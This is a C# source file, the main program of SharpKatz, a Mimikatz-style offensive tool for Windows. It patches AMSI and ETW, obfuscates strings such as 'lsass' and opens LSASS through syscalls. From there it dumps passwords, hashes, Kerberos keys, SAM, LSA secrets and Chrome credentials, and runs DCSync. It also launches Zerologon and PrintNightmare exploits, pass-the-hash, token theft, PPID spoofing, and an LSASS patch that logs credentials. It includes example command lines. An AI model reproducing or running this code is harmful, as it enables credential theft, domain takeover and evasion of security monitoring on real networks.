//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using NDesk.Options;
using SharpKatz.Credential;
using SharpKatz.Evasion;
using SharpKatz.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using static SharpKatz.Module.Kerberos;

namespace SharpKatz
{
    public class Program
    {

        public static void Main(string[] args)
        {
            // Initialize evasion: patch ETW and AMSI before any sensitive operation
            PatchHelper.ApplyAll();

            // Initialize dynamic SSN resolution from clean ntdll on disk
            SsnResolver.Initialize();

            string command = null;
            string user = null;
            string guid = null;
            string altservice = null;
            string domain = null;
            string dc = null;
            string ntlmHash = null;
            string aes128 = null;
            string aes256 = null;
            string rc4 = null;
            string binary = null;
            string arguments = null;
            string luid = null;
            string impersonateStr = null;
            string authuser = null;
            string authdomain = null;
            string authpassword = null;
            string forcentlmStr = null;
            string mode = null;
            string auth = null;
            string target = null;
            string machineaccount = null;
            string nullsessionStr = null;
            string library = null;
            string system = null;
            string sam = null;
            string security = null;
            string certExportStr = null;
            string certDir = null;
            string pid = null;
            string password = null;
            string parentpid = null;
            string parentname = null;
            // DPAPI parameters
            string sid = null;
            string hash = null;
            string pvkFile = null;
            string backupKey = null;
            string masterkeyFile = null;
            string blobFile = null;
            string mkFile = null;
            string mkGuid = null;
            string masterkey = null;
            string outputFile = null;
            string outputDir = null;
            // dpapi::cred parameters
            string credFile = null;
            string credDir = null;
            // dpapi::chrome parameters
            string loginData = null;
            string localState = null;
            // netsync parameters
            string account = null;
            bool showhelp = false;

            OptionSet opts = new OptionSet()
            {
                { "Command=", "--Command logonpasswords,ekeys,msv,kerberos,tspkg,credman,wdigest,dcsync,zerologon,printnightmare,token,vault,spawn", v => command = v },
                { "User=", "--User [user]", v => user = v },
                { "Guid=", "--Guid [guid]", v => guid = v },
                { "Domain=", "--Domain [domain]", v => domain = v },
                { "DomainController=", "--DomainController [domaincontroller]", v => dc = v },

                { "NtlmHash=", "--NtlmHash [ntlmHash]", v => ntlmHash = v },
                { "Aes128=", "--Aes128 [aes128]", v => aes128 = v },
                { "Aes256=", "--Aes256 [aes256]", v => aes256 = v },
                { "Rc4=", "--Rc4 [rc4]", v => rc4 = v },
                { "Binary=", "--Binary [binary]", v => binary = v },
                { "Arguments=", "--Arguments [arguments]", v => arguments = v },
                { "Luid=", "--Luid [luid]", v => luid = v },
                { "Impersonate=", "--Impersonate [impersonate]", v => impersonateStr = v },

                { "Mode=", "--Mode [mode]", v => mode = v },
                { "Auth=", "--Auth [auth]", v => auth = v },
                { "Target=", "--Target [target]", v => target = v },
                { "MachineAccount=", "--MachineAccount [machineaccount]", v => machineaccount = v },
                { "NullSession=", "--NullSession [nullsession]", v => nullsessionStr = v },

                { "AuthUser=", "--AuthUser [authuser]", v => authuser = v },
                { "AuthDomain=", "--AuthDomain [authdomain]", v => authdomain = v },
                { "AuthPassword=", "--AuthPassword [authpassword]", v => authpassword = v },
                { "ForceNtlm=", "--ForceNtlm [forcentlm]", v => forcentlmStr = v },

                { "Library=", "--Library [library]", v => library = v },

                { "System=", "--System [systempath]", v => system = v },
                { "Sam=", "--Sam [sampath]", v => sam = v },
                { "Security=", "--Security [securitypath]", v => security = v },
                { "CertExport=", "--CertExport [true/false]", v => certExportStr = v },
                { "CertDir=", "--CertDir [outputdir]", v => certDir = v },

                { "Pid=", "--Pid [pid]", v => pid = v },
                { "Password=", "--Password [password]", v => password = v },
                { "ParentPid=", "--ParentPid [parentpid]", v => parentpid = v },
                { "ParentName=", "--ParentName [parentname]", v => parentname = v },

                { "Altservice=", "--Altservice [alternative service]", v => altservice = v },

                // DPAPI parameters
                { "Sid=", "--Sid [user SID]", v => sid = v },
                { "Hash=", "--Hash [SHA1/NTLM hash]", v => hash = v },
                { "PvkFile=", "--PvkFile [pvk file path]", v => pvkFile = v },
                { "BackupKey=", "--BackupKey [domain backup key hex]", v => backupKey = v },
                { "MasterkeyFile=", "--MasterkeyFile [masterkey file path]", v => masterkeyFile = v },
                { "BlobFile=", "--BlobFile [DPAPI blob file path]", v => blobFile = v },
                { "MkFile=", "--MkFile [masterkey cache file (guid:hex)]", v => mkFile = v },
                { "MkGuid=", "--MkGuid [masterkey GUID]", v => mkGuid = v },
                { "Masterkey=", "--Masterkey [masterkey hex]", v => masterkey = v },
                { "OutputFile=", "--OutputFile [output file path]", v => outputFile = v },
                { "OutputDir=", "--OutputDir [output directory]", v => outputDir = v },
                { "DC=", "--DC [domain controller]", v => dc = v },
                // dpapi::cred parameters
                { "CredFile=", "--CredFile [credential file path]", v => credFile = v },
                { "CredDir=", "--CredDir [credentials directory]", v => credDir = v },
                // dpapi::chrome parameters
                { "LoginData=", "--LoginData [Chrome Login Data path]", v => loginData = v },
                { "LocalState=", "--LocalState [Chrome Local State path]", v => localState = v },
                // netsync parameters
                { "Account=", "--Account [target account]", v => account = v },

                { "h|?|help",  "Show available options", v => showhelp = v != null },
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool impersonate = false;
            try
            {
                if (!string.IsNullOrEmpty(impersonateStr))
                    impersonate = bool.Parse(impersonateStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool forcentlm = false;
            try
            {
                if (!string.IsNullOrEmpty(forcentlmStr))
                    forcentlm = bool.Parse(forcentlmStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            bool nullsession = false;
            try
            {
                if (!string.IsNullOrEmpty(nullsessionStr))
                    nullsession = bool.Parse(nullsessionStr);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (string.IsNullOrEmpty(command))
            {
                showhelp = true;
            }

            if (showhelp)
            {
                Console.WriteLine();
                Console.WriteLine("  Usage: SharpKatz.exe --Command <command> [options]");
                Console.WriteLine();
                Console.WriteLine("  Available commands:");
                Console.WriteLine();
                Console.WriteLine("  sekurlsa:");
                Console.WriteLine("    logonpasswords       Dump credentials from all providers");
                Console.WriteLine("    msv                  MSV provider credentials");
                Console.WriteLine("    kerberos             Kerberos provider credentials");
                Console.WriteLine("    tspkg                TsPkg provider credentials");
                Console.WriteLine("    credman              Credential Manager credentials");
                Console.WriteLine("    wdigest              WDigest provider credentials");
                Console.WriteLine("    ekeys                Kerberos encryption keys");
                Console.WriteLine("    ssp                  SSP/LiveSSP provider credentials");
                Console.WriteLine("    cloudap              Azure AD / Entra ID cached PRT");
                Console.WriteLine("    sekurlsadpapi        Cached DPAPI masterkeys from LSASS");
                Console.WriteLine();
                Console.WriteLine("  lsadump:");
                Console.WriteLine("    dcsync               DCSync — dump AD credentials via DRS");
                Console.WriteLine("    dumpsam              Dump SAM database from registry hives");
                Console.WriteLine("    lsasecrets           Dump LSA secrets from SECURITY hive");
                Console.WriteLine("    lsacache             Dump cached domain logons (DCC2)");
                Console.WriteLine("    backupkeys           Extract DPAPI domain backup keys from DC");
                Console.WriteLine("    netsync              Netlogon password sync (retrieve NTLM hashes)");
                Console.WriteLine();
                Console.WriteLine("  dpapi:");
                Console.WriteLine("    dpapimasterkey       Decrypt DPAPI masterkey file");
                Console.WriteLine("    dpapiblob            Decrypt DPAPI-protected blob");
                Console.WriteLine("    dpapicred            Decrypt Credential Manager files");
                Console.WriteLine("    chrome               Decrypt Chrome/Edge saved passwords");
                Console.WriteLine();
                Console.WriteLine("  crypto:");
                Console.WriteLine("    certexport           Export certificates from local store");
                Console.WriteLine();
                Console.WriteLine("  exploit:");
                Console.WriteLine("    zerologon            CVE-2020-1472 Netlogon");
                Console.WriteLine("    printnightmare       CVE-2021-1675 PrintSpooler RCE");
                Console.WriteLine("    hivenightmare        CVE-2021-36934 SAM hive read");
                Console.WriteLine();
                Console.WriteLine("  misc:");
                Console.WriteLine("    pth                  Pass-the-Hash");
                Console.WriteLine("    token                Token manipulation");
                Console.WriteLine("    vault                Windows Vault credentials");
                Console.WriteLine("    spawn                Spawn process with PPID spoofing");
                Console.WriteLine("    memssp               Patch LSASS to log credentials (memory-only)");
                Console.WriteLine("    listshadows          Enumerate shadow copies");
                Console.WriteLine();
                Console.WriteLine("  Examples:");
                Console.WriteLine("    SharpKatz.exe --Command logonpasswords");
                Console.WriteLine("    SharpKatz.exe --Command dcsync --User admin --Domain corp.local --DomainController dc01");
                Console.WriteLine("    SharpKatz.exe --Command pth --User admin --Domain corp --NtlmHash <hash>");
                Console.WriteLine("    SharpKatz.exe --Command dumpsam --System <system_path> --Sam <sam_path>");
                Console.WriteLine("    SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <SID> --Password <pass>");
                Console.WriteLine("    SharpKatz.exe --Command dpapicred --CredFile <path> --Masterkey <hex> --MkGuid <GUID>");
                Console.WriteLine("    SharpKatz.exe --Command chrome --LoginData <path> --LocalState <path> --MkFile <cache>");
                Console.WriteLine("    SharpKatz.exe --Command netsync --DC dc01 --User DC01$ --NtlmHash <hash> --Account targetuser");
                Console.WriteLine("    SharpKatz.exe --Command memssp");
                Console.WriteLine("    SharpKatz.exe --Command token --Mode list");
                Console.WriteLine("    SharpKatz.exe --Command spawn --Binary cmd.exe --ParentName svchost");
                Console.WriteLine();
                Console.WriteLine("  Use --help for full parameter list");
                Console.WriteLine();
                return;
            }

            if (!command.Equals("logonpasswords") && !command.Equals("msv") && !command.Equals("kerberos") && !command.Equals("credman") &&
                !command.Equals("tspkg") && !command.Equals("wdigest") && !command.Equals("ekeys") && !command.Equals("dcsync") &&
                !command.Equals("pth") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") &&
                !command.Equals("listshadows") && !command.Equals("dumpsam") &&
                !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") &&
                !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn") &&
                !command.Equals("dpapimasterkey") && !command.Equals("dpapiblob") && !command.Equals("backupkeys") &&
                !command.Equals("sekurlsadpapi") && !command.Equals("ssp") && !command.Equals("cloudap") &&
                !command.Equals("dpapicred") && !command.Equals("chrome") &&
                !command.Equals("memssp") && !command.Equals("netsync"))
            {
                Console.WriteLine("Unknown command");
                return;
            }

            if (IntPtr.Size != 8)
            {
                Console.WriteLine("Windows 32bit not supported");
                return;
            }

            OSVersionHelper osHelper = new OSVersionHelper();
            // Removed PrintOSVersion() — avoid noisy console output

            if (osHelper.build <= 9600)
            {
                Console.WriteLine("Unsupported OS Version");
                return;
            }

            // --- Commands that do NOT need LSASS ---

            if (command.Equals("token"))
            {
                if (string.IsNullOrEmpty(mode))
                    mode = "list";

                switch (mode)
                {
                    case "list":
                        var tokens = Module.Token.ListTokens();
                        Console.WriteLine("\n  Available tokens ({0} unique):\n", tokens.Count);
                        foreach (var t in tokens)
                        {
                            Console.WriteLine("    PID {0,-6} {1,-20} {2}\\{3} {4}",
                                t.ProcessId, t.ProcessName, t.Domain, t.Username,
                                t.IsElevated ? "[ELEVATED]" : "");
                        }
                        break;

                    case "steal":
                        if (string.IsNullOrEmpty(pid) || !int.TryParse(pid, out int stealPid))
                        {
                            Console.WriteLine("   Missing or invalid parameter -> Pid");
                            return;
                        }
                        Module.Token.StealToken(stealPid);
                        break;

                    case "make":
                        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(password))
                        {
                            Console.WriteLine("   Missing required parameters -> User, Domain, Password");
                            return;
                        }
                        Module.Token.MakeToken(domain, user, password);
                        break;

                    case "elevate":
                        Module.Token.ElevateToSystem();
                        break;

                    case "revert":
                        Module.Token.Revert();
                        break;

                    default:
                        Console.WriteLine("   Invalid Mode for token. Use: list, steal, make, elevate, revert");
                        break;
                }
                return;
            }

            if (command.Equals("vault"))
            {
                Module.Vault.PrintCredentials();
                return;
            }

            if (command.Equals("spawn"))
            {
                if (string.IsNullOrEmpty(binary))
                {
                    binary = @"C:\Windows\System32\cmd.exe";
                }

                if (!string.IsNullOrEmpty(parentpid))
                {
                    if (!int.TryParse(parentpid, out int ppid))
                    {
                        Console.WriteLine("   Invalid ParentPid value");
                        return;
                    }
                    Module.SpawnProcess.CreateWithParentSpoof(ppid, binary, arguments ?? "");
                }
                else
                {
                    Module.SpawnProcess.SpawnUnderParent(binary, arguments ?? "", parentname);
                }
                return;
            }

            if (command.Equals("netsync"))
            {
                if (string.IsNullOrEmpty(dc))
                {
                    Console.WriteLine("   Missing required parameter -> DC or DomainController");
                    return;
                }
                if (string.IsNullOrEmpty(user))
                {
                    Console.WriteLine("   Missing required parameter -> User (DC machine account, e.g. DC01$)");
                    return;
                }
                if (string.IsNullOrEmpty(ntlmHash))
                {
                    Console.WriteLine("   Missing required parameter -> NtlmHash");
                    return;
                }
                string targetAccount = account ?? user;
                Module.NetSync.RunNetSync(dc, user, ntlmHash, targetAccount);
                return;
            }

            if (command.Equals("dpapimasterkey"))
            {
                if (string.IsNullOrEmpty(masterkeyFile))
                {
                    Console.WriteLine("   Missing required parameter -> MasterkeyFile");
                    return;
                }
                Module.DpapiMasterkey.DecryptMasterkey(masterkeyFile, password, sid, hash, pvkFile, backupKey);
                return;
            }

            if (command.Equals("dpapiblob"))
            {
                if (string.IsNullOrEmpty(blobFile))
                {
                    Console.WriteLine("   Missing required parameter -> BlobFile");
                    return;
                }
                Module.DpapiBlob.DecryptBlobFile(blobFile, mkGuid, masterkey, mkFile, outputFile);
                return;
            }

            if (command.Equals("backupkeys"))
            {
                if (string.IsNullOrEmpty(dc))
                {
                    Console.WriteLine("   Missing required parameter -> DC or DomainController");
                    return;
                }
                bool exportPvk = true;
                Module.LsadumpBackupkeys.ExtractBackupKeys(dc, outputDir, exportPvk);
                return;
            }

            if (command.Equals("dpapicred"))
            {
                if (string.IsNullOrEmpty(credFile) && string.IsNullOrEmpty(credDir))
                {
                    Console.WriteLine("   Missing required parameter -> CredFile or CredDir");
                    Console.WriteLine("   Use --CredFile <path> for a single credential file");
                    Console.WriteLine("   Use --CredDir <path> to decrypt all files in a Credentials directory");
                    return;
                }

                if (!string.IsNullOrEmpty(credDir))
                {
                    Module.DpapiCred.DecryptCredentialDir(credDir, masterkey, mkGuid, mkFile);
                }
                else
                {
                    Module.DpapiCred.DecryptCredentialFile(credFile, masterkey, mkGuid, mkFile);
                }
                return;
            }

            if (command.Equals("chrome"))
            {
                if (string.IsNullOrEmpty(loginData))
                {
                    Console.WriteLine("   Missing required parameter -> LoginData");
                    Console.WriteLine("   Use --LoginData <path> to specify Chrome/Edge Login Data file");
                    Console.WriteLine("   Use --LocalState <path> to specify Chrome/Edge Local State file");
                    return;
                }
                if (string.IsNullOrEmpty(localState))
                {
                    Console.WriteLine("   Missing required parameter -> LocalState");
                    Console.WriteLine("   Use --LocalState <path> to specify Chrome/Edge Local State file");
                    return;
                }

                Module.DpapiChrome.DecryptChromePasswords(loginData, localState, masterkey, mkGuid, mkFile);
                return;
            }

            // --- Commands that need LSASS or elevated context ---

            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam") && !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") && !command.Equals("netsync"))
            {

                if (!Utility.IsElevated())
                {
                    Console.WriteLine("Run in High integrity context");
                    return;
                }

                Utility.SetDebugPrivilege();

                IntPtr lsasrv = IntPtr.Zero;
                IntPtr wdigest = IntPtr.Zero;
                IntPtr lsassmsv1 = IntPtr.Zero;
                IntPtr kerberos = IntPtr.Zero;
                IntPtr tspkg = IntPtr.Zero;
                IntPtr lsasslive = IntPtr.Zero;
                IntPtr dpapisrv = IntPtr.Zero;
                IntPtr cloudap = IntPtr.Zero;
                IntPtr hProcess = IntPtr.Zero;

                // Find target process PID via syscall enumeration (avoid managed Process API hooks)
                string targetProc = new string(new char[] { 'l', 's', 'a', 's', 's' });
                int targetPid = Module.SpawnProcess.FindSpoofParent(targetProc);
                if (targetPid <= 0)
                {
                    Console.WriteLine("Target process not found");
                    return;
                }

                // Open LSASS handle first via syscall (ZwOpenProcess), then enumerate modules
                // via PEB->Ldr walk using NtReadVirtualMemory — avoids managed Process.Modules
                // which calls OpenProcess internally and gets blocked by PPL
                hProcess = Natives.OpenProcess(
                    Natives.ProcessAccessFlags.VirtualMemoryRead |
                    Natives.ProcessAccessFlags.VirtualMemoryWrite |
                    Natives.ProcessAccessFlags.VirtualMemoryOperation |
                    Natives.ProcessAccessFlags.QueryInformation,
                    false, targetPid);

                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("Error: Could not open target process (requires SYSTEM or SeDebugPrivilege)");
                    return;
                }

                // Enumerate LSASS modules via PEB walk (NtQueryInformationProcess + NtReadVirtualMemory)
                var loadedModules = Natives.EnumerateModulesFromPeb(hProcess);

                string sLsasrv = new string(new char[] { 'l','s','a','s','r','v','.','d','l','l' });
                string sWdigest = new string(new char[] { 'w','d','i','g','e','s','t','.','d','l','l' });
                string sMsv = new string(new char[] { 'm','s','v','1','_','0','.','d','l','l' });
                string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
                string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
                string sDpapisrv = new string(new char[] { 'd','p','a','p','i','s','r','v','.','d','l','l' });
                string sCloudap = new string(new char[] { 'c','l','o','u','d','A','P','.','d','l','l' });

                foreach (var kvp in loadedModules)
                {
                    string lower = kvp.Key.ToLowerInvariant();
                    if (lower.Equals(sLsasrv)) lsasrv = kvp.Value;
                    else if (lower.Equals(sWdigest)) wdigest = kvp.Value;
                    else if (lower.Equals(sMsv)) lsassmsv1 = kvp.Value;
                    else if (lower.Equals(sKerb)) kerberos = kvp.Value;
                    else if (lower.Equals(sTspkg)) tspkg = kvp.Value;
                    else if (lower.Equals(sDpapisrv)) dpapisrv = kvp.Value;
                    else if (lower.Equals(sCloudap)) cloudap = kvp.Value;
                }

                Keys keys = new Keys(hProcess, lsasrv, osHelper);

                if (command.Equals("memssp"))
                {
                    if (lsassmsv1 == IntPtr.Zero)
                    {
                        Console.WriteLine("   [-] msv1_0.dll not found in LSASS modules");
                        return;
                    }
                    Module.MemSsp.PatchSpAcceptCredentials(hProcess, lsassmsv1, (int)osHelper.build);
                }
                else if (command.Equals("sekurlsadpapi"))
                {
                    // sekurlsa::dpapi — dump cached DPAPI masterkeys from LSASS
                    if (dpapisrv == IntPtr.Zero)
                    {
                        Console.WriteLine("   [-] dpapisrv.dll not found in LSASS modules");
                        Console.WriteLine("   [-] DPAPI masterkey cache may not be available");
                    }
                    Module.DpapiSekurlsa.FindCredentials(hProcess, dpapisrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), new List<Logon>());
                }
                else if (command.Equals("pth"))
                {
                    if (string.IsNullOrEmpty(binary))
                        binary = "cmd.exe";

                    Module.Pth.CreateProcess(hProcess, lsasrv, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), user, domain, ntlmHash, aes128, aes256, rc4, binary, arguments, luid, impersonate);
                }
                else
                {
                    List<Logon> logonlist = new List<Logon>();

                    Module.LogonSessions.FindCredentials(hProcess, lsasrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("msv"))
                        Module.Msv1.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("credman"))
                        Module.CredMan.FindCredentials(hProcess, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("tspkg"))
                        Module.Tspkg.FindCredentials(hProcess, tspkg, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("kerberos") || command.Equals("ekeys"))
                    {
                        List<KerberosLogonItem> klogonlist = Module.Kerberos.FindCredentials(hProcess, kerberos, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals("logonpasswords") || command.Equals("kerberos"))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetCredentials(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                        if (command.Equals("ekeys"))
                            foreach (KerberosLogonItem l in klogonlist)
                                Module.Kerberos.GetKerberosKeys(ref hProcess, l.LogonSessionBytes, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
                    }

                    if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                        Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("ssp"))
                        Module.Ssp.FindCredentials(hProcess, lsassmsv1, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    if (command.Equals("logonpasswords") || command.Equals("cloudap"))
                        Module.CloudAp.FindCredentials(hProcess, cloudap, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    // sekurlsa::dpapi — dump cached DPAPI masterkeys (part of logonpasswords)
                    if (command.Equals("logonpasswords") && dpapisrv != IntPtr.Zero)
                        Module.DpapiSekurlsa.FindCredentials(hProcess, dpapisrv, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);

                    Utility.PrintLogonList(logonlist);
                }


            }
            else
            {
                if (command.Equals("dcsync"))
                {
                    if (string.IsNullOrEmpty(domain))
                        domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
                    Console.WriteLine("   {0} will be the domain", domain);
                    if (string.IsNullOrEmpty(dc))
                    {
                        using (DirectoryEntry rootdse = new DirectoryEntry("LDAP://RootDSE"))
                            dc = (string)rootdse.Properties["dnshostname"].Value;
                    }
                    Console.WriteLine("   {0} will be the DC server", dc);
                    string alt_service = "ldap";
                    if (!string.IsNullOrEmpty(altservice))
                        alt_service = altservice;


                    if (!string.IsNullOrEmpty(guid))
                    {
                        Console.WriteLine("   {0} will be the Guid", guid);
                        Module.DCSync.FinCredential(domain, dc, guid: guid, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else if (!string.IsNullOrEmpty(user))
                    {
                        Console.WriteLine("   {0} will be the user account", user);
                        Module.DCSync.FinCredential(domain, dc, user: user, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm);
                    }
                    else
                    {
                        Module.DCSync.FinCredential(domain, dc, altservice: alt_service, authuser: authuser, authdomain: authdomain, authpassword: authpassword, forcentlm: forcentlm, alldata: true);
                    }
                }
                else
                {
                    if (command.Equals("zerologon"))
                    {
                        if (string.IsNullOrEmpty(mode) || (!mode.Equals("check") && !mode.Equals("exploit") && !mode.Equals("auto")))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> Mode");
                            return;
                        }
                        else if (mode.Equals("auto") && (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(dc)))
                        {
                            Console.WriteLine("   Missing required parameter -> Domain or DomainController");
                            return;
                        }
                        if (string.IsNullOrEmpty(target))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> Target");
                            return;
                        }

                        if (string.IsNullOrEmpty(machineaccount))
                        {
                            Console.WriteLine("   Missing or incorrect required parameter -> MachineAccount");
                            return;
                        }

                        int authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;

                        if (!string.IsNullOrEmpty(auth))
                        {
                            switch (auth)
                            {
                                case "noauth":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                                case "ntlm":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_WINNT;
                                    break;
                                case "kerberos":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_KERBEROS;
                                    break;
                                case "negotiate":
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_GSS_NEGOTIATE;
                                    break;
                                default:
                                    Console.WriteLine("   Invalid Auth parameter value, use default -> AUTHN_NONE");
                                    authnSvc = Module.DCSync.RPC_C_AUTHN_NONE;
                                    break;
                            }
                        }

                        bool success = Module.Zerologon.RunZerologon(mode, target, machineaccount, authnSvc, nullsession);

                        if (success == true)
                        {

                            Console.WriteLine("  ");

                            if (mode.Equals("auto"))
                            {
                                Console.WriteLine("   {0} will be the domain", domain);
                                Console.WriteLine("   {0} will be the DC server", dc);

                                if (!string.IsNullOrEmpty(guid))
                                {
                                    Console.WriteLine("   {0} will be the Guid", guid);
                                    Module.DCSync.FinCredential(domain, dc, guid: guid, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else if (!string.IsNullOrEmpty(user))
                                {
                                    Console.WriteLine("   {0} will be the user account", user);
                                    Module.DCSync.FinCredential(domain, dc, user: user, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true);
                                }
                                else
                                {
                                    Module.DCSync.FinCredential(domain, dc, authuser: machineaccount, authdomain: domain, authpassword: "", forcentlm: true, alldata: true);
                                }
                            }

                        }
                        else
                            Console.WriteLine("   Attack failed. Target is probably patched.");

                    }
                    else
                    {
                        if (command.Equals("printnightmare"))
                        {
                            if (string.IsNullOrEmpty(library))
                            {
                                Console.WriteLine("   Missing or incorrect required parameter -> Library");
                                return;
                            }

                            if (string.IsNullOrEmpty(target))
                            {
                                Console.WriteLine("   Missing or incorrect required parameter -> Target");
                                return;
                            }

                            Module.PrintNightmare.RunPrintNightmare(target, library, authuser: authuser, authdomain: authdomain, authpassword: authpassword);
                        }
                        else
                        {
                            if (command.Equals("hivenightmare"))
                            {
                                List<string> copies = Module.Shadow.ListShadowCopies();
                                if(copies.Count > 0)
                                {
                                    Console.WriteLine("   Using shadowcopy {0}", copies.ToArray()[0]);
                                    Console.WriteLine("  ");
                                    string systempath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SYSTEM");
                                    string sampath = string.Format("{0}Windows\\System32\\config\\{1}", copies.ToArray()[0], "SAM");

                                    Module.Sam.LsadumpSam(systempath, sampath);
                                }
                                else
                                {
                                    Console.WriteLine("   No shadowcopy found");
                                }
                            }
                            else
                            {
                                if (command.Equals("dumpsam"))
                                {
                                    if (string.IsNullOrEmpty(system))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
                                        return;
                                    }

                                    if (string.IsNullOrEmpty(sam))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> Sam");
                                        return;
                                    }

                                    Module.Sam.LsadumpSam(system, sam);

                                }
                                else if (command.Equals("lsasecrets"))
                                {
                                    if (string.IsNullOrEmpty(system))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
                                        return;
                                    }
                                    if (string.IsNullOrEmpty(security))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> Security");
                                        return;
                                    }

                                    Module.LsaSecrets.LsadumpSecrets(system, security);
                                }
                                else if (command.Equals("lsacache"))
                                {
                                    if (string.IsNullOrEmpty(system))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> System");
                                        return;
                                    }
                                    if (string.IsNullOrEmpty(security))
                                    {
                                        Console.WriteLine("   Missing or incorrect required parameter -> Security");
                                        return;
                                    }

                                    Module.LsaCache.LsadumpCache(system, security);
                                }
                                else if (command.Equals("certexport"))
                                {
                                    bool exportPfx = false;
                                    if (!string.IsNullOrEmpty(certExportStr))
                                    {
                                        try { exportPfx = bool.Parse(certExportStr); } catch { }
                                    }

                                    Module.CertificateExport.ExportCertificates(exportPfx, certDir);
                                }
                                else
                                {
                                    Module.Shadow.ListShadowCopies();
                                }
                            }
                        }     
                    }
                }
            }
        }
    }
}
